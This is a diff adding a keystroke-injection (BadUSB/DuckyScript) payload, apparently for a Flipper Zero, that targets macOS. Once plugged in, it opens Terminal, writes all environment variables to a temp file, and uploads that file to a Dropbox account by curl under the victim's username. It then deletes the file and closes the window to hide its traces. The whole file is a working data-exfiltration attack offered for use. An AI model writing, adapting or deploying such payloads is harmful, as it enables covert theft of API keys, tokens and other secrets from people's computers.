@@ -1,0 +1,44 @@
+REM Title: UploadEnv
+REM Author: sophia
+REM License: MIT
+REM Description: Uploads environment variables to a dropbox
+REM Target:	macOS 11.0+
+REM
+
+DEFAULTDELAY 200
+
+REM Open terminal
+GUI SPACE
+STRING terminal
+ENTER
+DELAY 1500
+
+REM Copy Environment variables to a new file
+STRING printenv >> /tmp/env.txt
+ENTER
+
+REM Export username to variable for file prefix
+STRING export FLIPPER_USER_NAME=$(whoami)
+ENTER
+
+REM Upload the file to the remote server with curl
+STRING curl -X POST https://content.dropboxapi.com/2/files/upload 
+STRING --header "Authorization: Bearer DROPBOX_BEARER_TOKEN" 
+STRING --header "Dropbox-API-Arg: { 
+STRING \"path\": \"/${FLIPPER_USER_NAME}/${FLIPPER_USER_NAME}_variables.txt\", 
+STRING \"mode\": \"overwrite\", 
+STRING \"autorename\": true, 
+STRING \"mute\": false}" 
+STRING --header "Content-Type: application/octet-stream" 
+STRING --data-binary @/tmp/env.txt 
+ENTER
+DELAY 2000
+
+REM Cleanup files
+STRING rm -rf /tmp/env.txt
+ENTER
+
+REM Close terminal
+STRING osascript -e 'tell application "Terminal" to close first window' & exit
+ENTER
+ENTER
